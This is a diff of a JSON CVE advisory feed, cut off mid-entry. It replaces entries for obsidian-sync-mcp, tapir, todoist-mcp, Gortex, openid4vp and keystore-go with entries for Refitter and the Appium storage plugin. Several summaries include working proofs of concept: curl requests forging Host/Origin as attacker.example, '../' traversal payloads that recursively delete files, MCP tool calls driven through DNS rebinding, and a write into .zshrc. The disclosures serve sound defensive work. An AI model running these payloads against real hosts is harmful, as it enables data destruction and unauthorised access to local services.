-      "summary": "When obsidian-sync-mcp runs without MCP_AUTH_TOKEN (the documented no-auth mode for local use), the HTTP MCP endpoint does not validate the Host or Origin header before dispatching MCP methods (CWE-350). The no-auth mode's \"local network only\" assumption therefore does not hold: a malicious web page the operator visits can use DNS rebinding to resolve an attacker-controlled hostname to 127.0.0.1 (or the operator's LAN/VPN/Docker-published address) and issue requests the server accepts as trusted local calls, reaching the full tool surface (read_note, write_note, edit_note, delete_note, move_note, list_notes, list_folders, list_tags, get_note_metadata).\n\nAffected versions: <= 0.5.6\nPatched version: 0.5.7\n\n## Impact\n\nAny deployment running without MCP_AUTH_TOKEN — including the README \"Filesystem mode (simplest)\" quickstart and the self-hosted docker-compose setup (where MCP_AUTH_TOKEN defaults to empty)\" — is exposed to any website the operator visits while the server is running. That page's JavaScript can silently read the entire vault and create/overwrite/delete/move notes, with no credentials and no prompt. In CouchDB/Self-hosted LiveSync mode, the same code path applies, so vault content in CouchDB is equally reachable. Deployments that set MCP_AUTH_TOKEN are not affected — a bearer token is not attached by browsers, so a forged request returns HTTP 401.\n\n## Remediation\n\nUpgrade to 0.5.7, which validates both the Host and Origin headers in no-auth mode: any request whose Host is not localhost/127.0.0.1/::1 (or a value in the new MCP_ALLOWED_HOSTS), or that carries a cross-origin Origin not in that allowlist, is rejected before any MCP method runs. The Host check defeats DNS rebinding; the Origin check defeats the related bypass where a page directly fetches http://127.0.0.1:<port>/mcp (genuine loopback Host, attacker Origin) — the transport's wildcard CORS would otherwise expose the response. Non-browser MCP clients send no Origin, so they are unaffected. These checks block browser-delivered attacks only; a direct non-browser network client can still forge both headers, so on untrusted networks set MCP_AUTH_TOKEN.\n\nWorkaround (any version): set MCP_AUTH_TOKEN to require authentication — this closes the path immediately.\n\n## Technical detail\n\nIn no-auth mode serverOptions.authenticate was never installed, so FastMCP dispatched every request with no per-request check. Even with a token, only the Authorization header was inspected — nothing in the server, fastmcp, or mcp-proxy validated Host/Origin. Two browser-reachable variants follow: (1) classic DNS rebinding, where the browser sends the attacker's hostname in Host; and (2) a direct cross-origin fetch() to the loopback address, where Host is genuinely 127.0.0.1 but Origin is attacker-controlled and the transport's wildcard Access-Control-Allow-Origin: * exposes the response — no rebinding required. The 0.5.7 fix adds an application-layer Host+Origin check in authenticate that rejects such requests before dispatch; it is a compensating control and does not alter the wildcard CORS header itself (the rejection happens before any response body is produced).\n\n## Proof of concept (mitigated in 0.5.7)\n```\n# No-auth server (per the README quickstart)\nVAULT_PATH=/tmp/demo-vault HOST=127.0.0.1 PORT=8787 npx tsx src/main.ts\n\n# Forged Host/Origin (what a DNS-rebinding page's fetch() sends) reaches the tools with no credential:\ncurl -s -i http://127.0.0.1:8787/mcp \\\n  -H \"Host: attacker.example\" -H \"Origin: http://attacker.example\" \\\n  -H \"Content-Type: application/json\" -H \"Accept: application/json, text/event-stream\" \\\n  -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"poc\",\"version\":\"1.0\"}}}'\n# -> HTTP 200; a follow-up tools/call to write_note creates a file in the vault, no Authorization header.\n# The same sequence against a server with MCP_AUTH_TOKEN set returns HTTP 401.\n```\n\n```\n# Variant 2 — no rebinding needed: real loopback Host, attacker Origin.\n# In <= 0.5.6 this returns 200 and executes tools; in 0.5.7 it returns 403.\ncurl -s -i http://127.0.0.1:8787/mcp \\\n  -H \"Host: 127.0.0.1:8787\" -H \"Origin: http://attacker.example\" \\\n  -H \"Content-Type: application/json\" -H \"Accept: application/json, text/event-stream\" \\\n  -d '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"poc\",\"version\":\"1.0\"}}}'\n```",
-      "cvssScore": 8.8,
+      "id": "CVE-2026-63184",
+      "summary": "### Summary\n\nRefitter (the `refitter` dotnet tool, built on NJsonSchema for `$ref` resolution) fetches remote\n`http(s)` URLs and reads local files (including absolute paths and `../` traversal outside the input\ndirectory), inlining the referenced schema into the generated Refit interface/contracts. Running\n`refitter <spec> --output Out.cs` on a spec whose `$ref` points at an attacker/internal URL or an\narbitrary local file yields SSRF, remote file inclusion, and local file inclusion. Verified on\nRefitter 2.0.0.\n\n### Details\n\n- `$ref: http://attacker-or-internal/evil.json#/...` -> build host fetches (SSRF) and inlines the\n  remote schema (RFI); confirmed property `REMOTE_REFIT_PROP`.\n- `$ref: /abs/path.json#/...` or `../../secret.json#/...` -> out-of-tree local file read + inlined\n  (LFI); confirmed property `REFIT_LFI_MARKER`. Both absolute and relative traversal work.\n\nNo RCE: Refitter emits Refit interfaces with no baseUrl string literal (Refit sets the base address at\nruntime), enum values use C# verbatim-string doubling, and string defaults are escaped. The chain\nstops at SSRF + RFI + LFI.\n\nThe `$ref` resolution is performed by Refitter's NJsonSchema dependency, which Refitter ships and\ninvokes with these unsafe defaults.\n\n### PoC\n\n`reproduce.sh` (+ `make_spec.py`, `listener.py`) attached: installs the .NET SDK + Refitter if needed,\nconfirms LFI (out-of-tree read), SSRF (listener hit during generation), and RFI (remote schema\ninlined). Verified on 2.0.0.\n\n### Impact\n\nBuild-time SSRF (CWE-918) from the developer or CI host, disclosure of arbitrary local files\n(CWE-22), and inclusion of untrusted remote content (CWE-829), from running Refitter on an\nattacker-controlled or attacker-influenced OpenAPI description. No code execution. Estimated\nMedium-High, e.g. `[reproduce.sh](https://github.com/user-attachments/files/29395269/reproduce.sh)` (the CNA sets the final score).\n\n### Suggested fix\n\nDon't resolve remote `$ref`s by default (opt-in + host allowlist); confine local `$ref` resolution to\nthe input directory tree (reject absolute paths and `../` escapes). Apply at all nesting levels.\nCoordinate with NJsonSchema, where the resolver lives.\n[maintainer-report.txt](https://github.com/user-attachments/files/29395271/maintainer-report.txt)\n[advisory.md](https://github.com/user-attachments/files/29395272/advisory.md)\n[reproduce.sh](https://github.com/user-attachments/files/29395283/reproduce.sh)\n[maintainer-report.txt](https://github.com/user-attachments/files/29395284/maintainer-report.txt)\n[advisory.md](https://github.com/user-attachments/files/29395285/advisory.md)\n[listener.py](https://github.com/user-attachments/files/29395286/listener.py)\n[make_spec.py](https://github.com/user-attachments/files/29395288/make_spec.py)",
+      "cvssScore": 7.1,
       "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
       "cwe": {
-        "cwe_id": "CWE-350",
-        "name": "Reliance on Reverse DNS Resolution for a Security-Critical Action"
+        "cwe_id": "CWE-829",
+        "name": "Inclusion of Functionality from Untrusted Control Sphere"
       },
       "references": [
-        "https://github.com/es617/obsidian-sync-mcp/security/advisories/GHSA-mx6p-3fg7-v6pj",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77283",
-        "https://github.com/es617/obsidian-sync-mcp/commit/d4d2cbbb02ffadaecf1d6252902b8d08610c7018",
-        "https://github.com/es617/obsidian-sync-mcp/releases/tag/v0.5.7",
-        "https://github.com/advisories/GHSA-mx6p-3fg7-v6pj"
+        "https://github.com/christianhelle/refitter/security/advisories/GHSA-x6w4-f264-3vvr",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-63184",
+        "https://github.com/christianhelle/refitter/pull/1173",
+        "https://github.com/christianhelle/refitter/commit/6ad20a3803561225100b0a4bb6b12f947d23db7b",
+        "https://github.com/christianhelle/refitter/releases/tag/2.1.1"
       ],
       "vulnerableProducts": [
-        "obsidian-sync-mcp npm"
+        "Refitter nuget"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-76090",
-      "summary": "The OpenAPI code generator (tapir-openapi-codegen-core) builds Scala source by string templating and emitted several names/values from the (untrusted) OpenAPI document without escaping or validation, allowing injection of arbitrary Scala that runs at generated-code compile time and/or endpoint-assembly time (build/codegen-time RCE from an attacker-controlled spec).\n\nThis advisory covers the full class of sinks, all sharing one root cause and one fix (PR #5395, commit e015939b7): object property names (-> case-class fields), query/header/path parameter names (-> endpoint input DSL), and operation tags (-> .tags(List(...))). The fix routes identifier-position names through validation/quoting and string-literal values through JavaEscape.escapeString.\n\nConsolidates the separately-reported query-param (GHSA-h3vr-jggp-jw5v), header-param (GHSA-3pjr-m3pf-r66v) and tag (GHSA-jc99-w66r-pcx5) sinks, which are the same issue.",
-      "cvssScore": 8.4,
+      "id": "CVE-2026-58192",
+      "summary": "## Summary\n\nThe Appium storage plugin exposes an HTTP endpoint `POST /storage/delete` that takes a user-supplied `name` and deletes it from the server storage folder. The handler passes `name` straight into `path.join(storageRoot, name)` and then `fs.rimraf()` **without any path sanitization**. By sending a `name` containing `../` sequences, an unauthenticated remote client can escape the storage root and **recursively delete arbitrary files and directories** that the Appium process user can write, anywhere on the host filesystem.\n\nThe same plugin's *upload* path validates the name via `fs.sanitizeName` (`requireValidItemOptions`), but the *delete* path does not an asymmetry that makes the missing validation unambiguous.\n\n### Details\n\nPublished build (`node_modules/@appium/storage-plugin/build/lib/storage.js`), and source (`packages/storage-plugin/lib/`):\n\n- `packages/storage-plugin/lib/storage.ts:65-75` — `Storage.delete()`:\n  ```ts\n  async delete(name: string): Promise<boolean> {\n    if (name.toLowerCase().endsWith(TMP_EXT)) {\n      return false;\n    }\n    const destinationPath = path.join(this._root, name);   // <-- no sanitization\n    if (!(await fs.exists(destinationPath))) {\n      return false;\n    }\n    await fs.rimraf(destinationPath);                       // <-- recursive delete\n    return true;\n  }\n  ```\n- `packages/storage-plugin/lib/plugin.ts:77-83` — handler passes raw body:\n  ```ts\n  STORAGE_HANDLERS.deleteStorageItem = async function deleteStorageItem(req) {\n    return await executeStorageMethod(\n      async (storage) => await storage.delete(parseRequestArgs(req, ['name']).name),\n    );\n  };\n  ```\n`parseRequestArgs` (`plugin.ts:94-106`) only checks that the key exists; it does **not** validate the value.\n- Contrast — the upload path *does* sanitize: `storage.ts:53-54` `add()` →\n`requireValidItemOptions()` (`storage.ts:236-256`) rejects any `name` that differs from `fs.sanitizeName(name)`. `delete()` skips this entirely.\n\n### PoC\n\n1. Install and start the server with the storage plugin:\n   ```sh\n   npm install appium@3.5.0\n   ./node_modules/.bin/appium plugin install --source=npm @appium/storage-plugin\n   ./node_modules/.bin/appium --use-plugins=storage --address 127.0.0.1 --port 4723\n   ```\n(Default `--address` is `0.0.0.0`; `127.0.0.1` used here for a contained test.)\n\n2. Plant a victim file/dir outside the storage root, then delete via traversal:\n   ```sh\n   mkdir -p /tmp/pv_dir && echo SECRET > /tmp/pv_dir/important.txt\n   echo single > /tmp/pv_file.txt\n\n   curl -s -X POST http://127.0.0.1:4723/storage/delete \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"name\":\"../../../../../../../../../../tmp/pv_file.txt\"}'\n   # -> {\"value\":true}\n\n   curl -s -X POST http://127.0.0.1:4723/storage/delete \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"name\":\"../../../../../../../../../../tmp/pv_dir\"}'\n   # -> {\"value\":true}\n   ```\n\n<img width=\"2182\" height=\"678\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a4984132-3334-41c5-9a29-12ec59461d25\" />\n\n### Impact\n\nAn unauthenticated attacker who can reach the Appium HTTP port (network by default, or cross-origin via a victim browser due to default CORS + no auth) can recursively delete any file or directory writable by the Appium process user. On CI runners, device farms, and developer machines this enables destruction of source trees, build artifacts, SSH keys, configuration, or the OS user profile data loss and denial of service. Appium frequently runs with broad privileges on shared device-lab hosts, amplifying impact.",
+      "cvssScore": 8.6,
       "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code"
-      },
-      "references": [
-        "https://github.com/softwaremill/tapir/security/advisories/GHSA-gpcc-36pq-8qxr",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-76090",
-        "https://github.com/softwaremill/tapir/pull/5395",
-        "https://github.com/softwaremill/tapir/commit/e015939b78df2de0fa3d3b8ed02961425e02145e",
-        "https://github.com/softwaremill/tapir/releases/tag/v1.13.27"
-      ],
-      "vulnerableProducts": [
-        "com.softwaremill.sttp.tapir:tapir-openapi-codegen-core maven"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-76807",
-      "summary": "The self-hosted `todoist-mcp-http` server accepts browser-origin MCP requests with attacker-controlled `Host` and `Origin` headers. A malicious website can use DNS rebinding to route its own origin to a victim's local `127.0.0.1` MCP server, then invoke Todoist MCP tools without a caller credential.\n\nThis affects `github.com/Doist/todoist-mcp` at commit `d2903e0d945d2a559d71c091337ad6380511e62f`, package version `10.3.1`, when the optional Streamable HTTP server is running. The stdio entrypoint is not browser-reachable. The vulnerable browser-reachable component is `todoist-mcp-http`.\n\nThe documented HTTP server mode runs all MCP tools with the operator's `TODOIST_API_KEY` and binds to loopback by default:\n\n```bash\nTODOIST_API_KEY=your-key npx -p @doist/todoist-mcp todoist-mcp-http\n```\n\n`src/main-http.ts:28-30` sets the HTTP bind host and port:\n\n```ts\nconst PORT = Number.parseInt(process.env.PORT || '3000', 10)\nconst HOST = process.env.HOST || '127.0.0.1'\nconst LISTEN_HOST = normalizeListenHost(HOST)\n```\n\n`src/main-http.ts:88-99` dispatches `POST /mcp` to `StreamableHTTPServerTransport` without validating `Host` or `Origin`:\n\n```ts\napp.post(\n    '/mcp',\n    requireValidTodoistToken({ type: 'static', apiKey: todoistApiKey, baseUrl }),\n    async (req: Request, res: Response) => {\n        const transport = new StreamableHTTPServerTransport({\n            sessionIdGenerator: undefined,\n        })\n\n        const server = getMcpServer({ todoistApiKey, baseUrl })\n        await server.connect(transport)\n        await transport.handleRequest(req, res, req.body)\n    },\n)\n```\n\n`src/middleware/require-valid-todoist-token.ts:105-117` validates the configured server-side Todoist token and then forwards the request. It does not authenticate the browser caller:\n\n```ts\nconst valid = await getValidation()\n\nif (valid) {\n    next()\n    return\n}\n```\n\n`src/mcp-server.ts:215-285` registers Todoist read and write tools against the server-side Todoist API client, including `add-tasks`, `complete-tasks`, `update-tasks`, `delete-object`, comments, reminders, labels, filters, goals, and assignments.\n\n## Proof of concept\n\nStart the upstream local HTTP server with an operator-owned Todoist test account:\n\n```bash\ngit clone https://github.com/Doist/todoist-mcp.git\ncd todoist-mcp\ngit checkout d2903e0d945d2a559d71c091337ad6380511e62f\nnpm ci --ignore-scripts\nnpm run build\n\nexport TODOIST_API_KEY='<Todoist test account API token>'\nPORT=8082 HOST=127.0.0.1 node dist/main-http.js\n```\n\nThe server prints:\n\n```text\nTodoist MCP HTTP Server started on 127.0.0.1:8082\nMCP endpoint: http://127.0.0.1:8082/mcp\n```\n\nFrom a browser page using DNS rebinding, route the attacker origin to `127.0.0.1:8082` and send MCP JSON-RPC requests to `POST /mcp`.\n\nFirst enumerate tools. The rebound browser session can list Todoist write tools such as `add-tasks` and `complete-tasks`.\n\nCall `user-info`:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"user-info\",\n    \"arguments\": {}\n  }\n}\n```\n\nObserved result: the response returns the Todoist account tied to the server-held `TODOIST_API_KEY`.\n\nCreate a disposable task:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"add-tasks\",\n    \"arguments\": {\n      \"tasks\": [\n        {\n          \"content\": \"DNS REBINDING DEMO - attacker-created task\",\n          \"description\": \"Created through browser-origin DNS rebinding against local todoist-mcp-http.\",\n          \"priority\": \"p1\",\n          \"dueString\": \"today\"\n        }\n      ]\n    }\n  }\n}\n```\n\nObserved result: Todoist creates the task and the MCP response returns the new task ID.\n\nComplete the same task:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"complete-tasks\",\n    \"arguments\": {\n      \"ids\": [\n        \"<RETURNED_TASK_ID>\"\n      ]\n    }\n  }\n}\n```\n\nObserved result: the MCP response returns `successCount: 1`, and the Todoist UI shows the same task completed.\n\n[demo video](https://drive.google.com/file/d/1zfgYQS-vbi1zc8N2JayShtwBCZbN-doG/view)\n\n## Impact\n\nA public website can operate a victim's local `todoist-mcp-http` server when the optional HTTP transport is running. The browser does not supply a Todoist API token. The MCP server supplies its configured `TODOIST_API_KEY`.\n\nThe demonstrated impact is Todoist task creation and completion. The same browser-origin path exposes the rest of the registered Todoist write surface, including task updates, task rescheduling, project and section changes, comments, reminders, filters, labels, goals, assignments, and object deletion.\n\nThis violates the browser-origin boundary. A user can run the MCP server only on loopback and still become reachable from an unrelated public website because DNS rebinding preserves the attacker's `Host` and `Origin` while routing the TCP connection to `127.0.0.1`.\n\n## Why this is a vulnerability\n\n- The default HTTP bind target is loopback, which users reasonably treat as local-only.\n- DNS rebinding makes loopback HTTP reachable from a public website unless the server validates `Host` and `Origin`.\n- The MCP route does not require a per-request caller secret.\n- The middleware validates the server's Todoist backend token, not the browser caller.\n- Tool execution uses the server-held `TODOIST_API_KEY` to mutate Todoist state.\n\n## Remediation\n\nAdd strict `Host` validation before MCP dispatch. For local deployments, accept only explicit loopback hostnames such as `127.0.0.1`, `localhost`, `[::1]`, and any operator-configured trusted names.\n\nReject browser requests with missing or untrusted `Origin` values before they reach `StreamableHTTPServerTransport`.\n\nRequire a per-run local bearer token or equivalent caller secret for HTTP MCP mode, including loopback deployments. Host and Origin validation reduce DNS-rebinding exposure, but they are not caller authentication.\n\nEnable DNS rebinding protection in the MCP SDK HTTP transport if available, and pass explicit allowed host and origin lists. Keep stdio as the safest default local transport.\n\n## Reporter\n\nAvishai Gonen - Pluto Security",
-      "cvssScore": 9.3,
-      "severity": "Critical",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-346",
-        "name": "Origin Validation Error"
-      },
-      "references": [
-        "https://github.com/Doist/todoist-mcp/security/advisories/GHSA-833v-v58w-294h",
-        "https://github.com/todoist/todoist-mcp/security/advisories/GHSA-833v-v58w-294h",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-76807",
-        "https://github.com/todoist/todoist-mcp/pull/516",
-        "https://github.com/todoist/todoist-mcp/commit/245bf29cf5dbd8272e2aa896ad38557f91f8a16a"
-      ],
-      "vulnerableProducts": [
-        "@doist/todoist-mcp npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-62964",
-      "summary": "### Summary\nGortex is an MCP server exposing `write_file`, `edit_file`, and `move_inline` tools. `resolveFilePath` **exempts absolute paths** from confinement, and the write handlers — unlike `read_file` / `get_symbol_source` — **never call `guardSymlinkWithinRepo`**. A single MCP `write_file` call with an absolute path writes any file the daemon user can, **outside every indexed repo root** (`AtomicWriteFile`'s `MkdirAll` auto-creates missing parents). Writing `~/.zshrc`, `~/.bashrc`, `.git/hooks/pre-commit`, or a cron/systemd unit yields code execution on the next shell/commit. This directly violates the project's own `SECURITY.md` invariant *\"File-path resolution is **confined to indexed repository roots**\"*\n\n### Affected\n`internal/mcp/tools_fileops.go` (+ `tools_move_inline.go`), HEAD `28fa017` (v0.53.0).\n**CWE-22** (Path Traversal) / **CWE-73** (External Control of File Name/Path) → **CWE-94** (code execution).\n\n### Vulnerable code\n`internal/mcp/tools_fileops.go:54-62` `resolveFilePath` exempts absolute paths from the repo-root confinement; the write sink at `:793` (`AtomicWriteFile`, `write_file`) and `:676` (`edit_file`) run with **no** `guardSymlinkWithinRepo`. The asymmetry is the bug: `read_file` (`:940`) and `get_symbol_source` **do** call `guardSymlinkWithinRepo`; the write path does not.\n\n### PoC (executed)\nThe PoC (`internal/mcp/poc_arbitrary_write_test.go`, package `mcp`) builds the server via the repo's **own** `newSingleRepoServer(t)` harness and invokes the real `srv.handleWriteFile` through the genuine `mcplib.CallToolRequest` shape:\n```\n=== RUN   TestPoC_ArbitraryWrite_AbsolutePathEscapesEveryRepoRoot\n  indexed repo root (confinement boundary): /var/folders/.../myrepo\n  handler status=created path=/var/folders/.../003/pwn.txt bytes_written=50\n  PROOF: /var/folders/.../003/pwn.txt now exists with attacker bytes \"OWNED-by-gortex-write_file-outside-every-repo-root\"\n  RCE-PATH PROOF: wrote /var/folders/.../004/victim-home/.zshrc (parent dir auto-created) -> \"echo PWNED_BY_GORTEX_RCE # injected via write_file\"\n  VIOLATION of SECURITY.md line 17 (\"It does not write to source files\")\nPASS  (go test ok)\n```\nThe test asserts the handler did **not** return `IsError` and that the files exist outside every repo root. (Full PoC available on request.)\n\n### Impact\n`write_file` / `edit_file` are MCP tools driven by an LLM agent. A prompt-injected or adversarial agent (the standard MCP threat model) writes any file the daemon user can — startup/hook/cron files → arbitrary code execution on the host running the daemon. Confinement (the security property `SECURITY.md` promises) is broken on the write path.\n\n### Severity\n**High — CVSS v3.1 `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` ≈ 8.x.** `UI:R` reflects that a tool call must be elicited from the agent (standard MCP injected-tool model). The RCE is a chain (write a startup/hook file → execute on next trigger), so `I:H` + the code-execution path. Floor: if the deployment never exposes write tools to untrusted input, impact is lower — but the tool is shipped and the confinement guard is simply absent on the write path.\n\n### Remediation\nApply `guardSymlinkWithinRepo` (and reject absolute paths outside the indexed roots) on `write_file` / `edit_file` / `move_inline`, identically to `read_file` / `get_symbol_source`. Confinement must cover the write path.\n\n### Dedup / freshness (re-verified live)\n`gh api repos/zzet/gortex/security-advisories` → `[]` (none). `gh search prs/issues` for `resolveFilePath` / `guardSymlinkWithinRepo` / symlink / traversal / confinement → 0 (re-verified 2026-06-27; recent merges #175-#183 touch indexer/persistence, not the write path). `resolveFilePath` / `guardSymlinkWithinRepo` are gortex-own code (not vendored). **Fresh** at HEAD `28fa017`.",
-      "cvssScore": 7.8,
-      "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
       "cwe": {
         "cwe_id": "CWE-22",
         "name": "Improper Limitation of a Pathname to a Restricted Directory"
       },
       "references": [
-        "https://github.com/zzet/gortex/security/advisories/GHSA-w42c-h7hr-f67p",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-62964",
-        "https://github.com/zzet/gortex/commit/5ba2f066dd6dcd726c4e61b74851862dc596d994",
-        "https://github.com/zzet/gortex/releases/tag/v0.55.0",
-        "https://github.com/advisories/GHSA-w42c-h7hr-f67p"
+        "https://github.com/appium/appium/security/advisories/GHSA-jwgx-mp9m-jwcr",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-58192",
+        "https://github.com/appium/appium/pull/22362",
+        "https://github.com/appium/appium/commit/5fee01752f2782e96fbe64fd13520b433d4a7535",
+        "https://github.com/appium/appium/releases/tag/%40appium/storage-plugin%401.1.6"
       ],
       "vulnerableProducts": [
-        "github.com/zzet/gortex go"
+        "@appium/storage-plugin npm"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-75522",
-      "summary": "## Summary\n\n`ChainBuilder` (the private RFC 5280 validator behind `TrustEvaluator` and the public credential-parsing API) terminated chain building on **Subject Distinguished Name string equality** rather than on cryptographic closure to a trust anchor. A certificate whose Subject DN string matched a trusted anchor's Subject DN was accepted as the chain terminus **with no signature verification** against the anchor's public key.\n\nAn attacker who mints a self-signed certificate and copies a trusted anchor's Subject DN string onto it can therefore have that certificate — and any credential signed with its private key — accepted as issued under a trusted authority.\n\n## Impact\n\nA relying party using `@openeudi/openid4vp` to verify OpenID4VP presentations (mdoc / SD-JWT VC) could be induced to accept a **forged credential as genuine**, defeating the trust-anchor model. In an eIDAS / EUDI age- or identity-verification deployment this permits impersonation of a trusted issuer.\n\nExploitable through the public verification path: `TrustEvaluator.evaluate()` returns a successful result (and, due to a secondary fallback, attributes the forged leaf to a real anchor's metadata), so downstream callers see a trusted outcome.\n\n## Details\n\n`src/trust/ChainBuilder.ts`, `tryBuild()`:\n\n```js\nwhile (current.subject !== anchor.subject) { /* verify & climb */ }\n// loop exits when current.subject === anchor.subject\nreturn chain;  // returned WITHOUT verifying `current` against the anchor\n```\n\nThe signature-verified closure path (`if (!issuer)` -> `verifySignature(current, anchor)`) is correct, but the `while` guard provides a second, unverified exit: when a supplied certificate (the leaf, or an attacker-supplied intermediate) has a Subject DN string equal to the anchor's, the loop body never runs, no `verifySignature` call is made, and the chain is returned as valid. The per-certificate checks that do run (validity, algorithm, keyUsage) all operate on the attacker-controlled certificate and do not bind it to the anchor.\n\nSecondary contributing weakness (`src/trust/TrustEvaluator.ts`): the anchor selected for the result was matched by `serialNumber` and **fell back to `anchors[0]`** when no match was found, so the forged leaf was reported alongside a genuine anchor's `trustedAuthorityIds` / provenance.\n\n## Proof of Concept\n\n```js\n// Attacker mints a self-signed cert reusing a trusted anchor's Subject DN.\nconst impostor = selfSigned({ subject: trustedAnchor.subject /* string */ });\n// Vulnerable: resolves to a valid chain [impostor] with no signature check.\nawait new ChainBuilder().build(impostor, [trustedAnchor]);\n```\n\n## Patch\n\n`ChainBuilder.tryBuild()` now requires the terminating certificate to be **byte-identical to the trust anchor** (DER `rawData` comparison) when the loop exits on DN equality; otherwise it throws `CertificateChainError` with `reason: \"signature\"`. Cryptographic closure via `verifySignature(current, anchor)` remains the only other accepted termination. As defense-in-depth, `TrustEvaluator` now selects the terminating anchor by DER byte-identity and throws instead of silently falling back to the first candidate. Fixed in `0.8.1`.\n\n## Workarounds\n\nNone. Upgrade to `0.8.1`.\n\n## Credits\n\nReported by **Reza Shokri** — Quellkern e.U. (https://augenmass.tech), GitHub [@devdotbo](https://github.com/devdotbo). Thanks for the thorough report, the self-contained reproduction, and coordinated disclosure.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-295",
-        "name": "Improper Certificate Validation"
-      },
-      "references": [
-        "https://github.com/openeudi/openid4vp/security/advisories/GHSA-4c2f-96cf-f5fc",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-75522",
-        "https://github.com/openeudi/openid4vp/pull/25",
-        "https://github.com/openeudi/openid4vp/commit/a3ffd435aadd61aff1f75ec4b2e1a0f44ffabf16",
-        "https://github.com/openeudi/openid4vp/releases/tag/v0.8.1"
-      ],
-      "vulnerableProducts": [
-        "@openeudi/openid4vp npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-76101",
-      "summary": "### Summary\n`keystore.Decode()` fails to check the error returned when reading the trailing SHA-1 integrity digest of a JKS keystore. If an attacker removes the final 20 bytes from a `.jks` file, the digest read returns an empty slice and the byte-comparison loop never executes, so `Decode()` returns the parsed keystore with `err == nil`. This defeats both tamper detection and — for certificate-only truststores — the password check itself, allowing an attacker with write access to a keystore file (but without knowledge of the keystore password) to silently inject or replace trusted CA certificates.\n\n### Details\n**Affected versions:** `github.com/pavel-v-chernykh/keystore-go` ≤ `v2.1.0+incompatible` (the final release on this module path).  v3 and v4 releases are not impacted.\n\nIn `decoder.go`, function `Decode`, lines 264-272:\n\n```go\ncomputedDigest := ksd.md.Sum(nil)\nactualDigest, err := ksd.readBytes(uint32(ksd.md.Size()))\nfor i := 0; i < len(actualDigest); i++ {\n    if actualDigest[i] != computedDigest[i] {\n        return nil, ErrInvalidDigest\n    }\n}\n\nreturn keyStore, nil\n```\n\nTwo defects combine here:\n\n1. The `err` returned by `ksd.readBytes(20)` on line 265 is assigned but never inspected.\n2. The comparison loop on line 266 is bounded by `len(actualDigest)` rather than `len(computedDigest)`.\n\n`readBytes` (`decoder.go` lines 75-94) reads the requested bytes via `io.ReadFull`; on EOF/short read it returns `(nil, ErrIo)`:\n\n```go\n_, err := io.ReadFull(ksd.r, ksd.b[:blockSize])\nif err != nil {\n    return result, ErrIo\n}\n```\n\nWhen the trailing 20-byte digest is absent from the input stream, `actualDigest` is therefore `nil`, `len(actualDigest) == 0`, the `for` loop body never executes, and `Decode()` falls through to `return keyStore, nil`.\n\nThe JKS format's only integrity guarantee is this trailing `SHA1(passwordBytes || \"Mighty Aphrodite\" || body)` digest. For truststores containing only `TrustedCertificateEntry` values it is also the *only* place the password is verified. Consequently:\n\n- An attacker who can modify a `.jks` truststore on disk — but does **not** know the keystore password — can replace or add trusted CA certificates, drop the last 20 bytes of the file, and the consuming Go process will load the forged truststore as valid.\n- After the digest is stripped, `Decode()` accepts **any** password, so operators who believe the password gates integrity receive no error even when the wrong password is supplied.\n\nThe reference Java `JavaKeyStore` implementation reads the digest with `DataInputStream.readFully` and throws on short read; this Go port diverges from that behaviour.\n\n### PoC\n```\ngo mod init poc\ngo get github.com/pavel-v-chernykh/keystore-go@v2.1.0+incompatible\ngo run .\n```\n\n```go\npackage main\n\nimport (\n        \"bytes\"\n        \"fmt\"\n        \"os\"\n\n        keystore \"github.com/pavel-v-chernykh/keystore-go\"\n)\n\nfunc main() {\n        originalCert := []byte(\"ORIGINAL-TRUSTED-CA-CERTIFICATE\")\n        evilCert := []byte(\"EVIL-ATTACKER-CA-CERTIFICATE!!!\") // same length\n\n        ks := keystore.KeyStore{\n                \"trusted-ca\": &keystore.TrustedCertificateEntry{\n                        Certificate: keystore.Certificate{\n                                Type:    \"X509\",\n                                Content: originalCert,\n                        },\n                },\n        }\n\n        var buf bytes.Buffer\n        if err := keystore.Encode(&buf, ks, []byte(\"correct-password\")); err != nil {\n                panic(err)\n        }\n        legit := buf.Bytes()\n        fmt.Printf(\"[*] Legitimate keystore: %d bytes (last 20 = SHA-1 digest)\\n\", len(legit))\n\n        // Sanity: untampered keystore with WRONG password is rejected.\n        _, err := keystore.Decode(bytes.NewReader(legit), 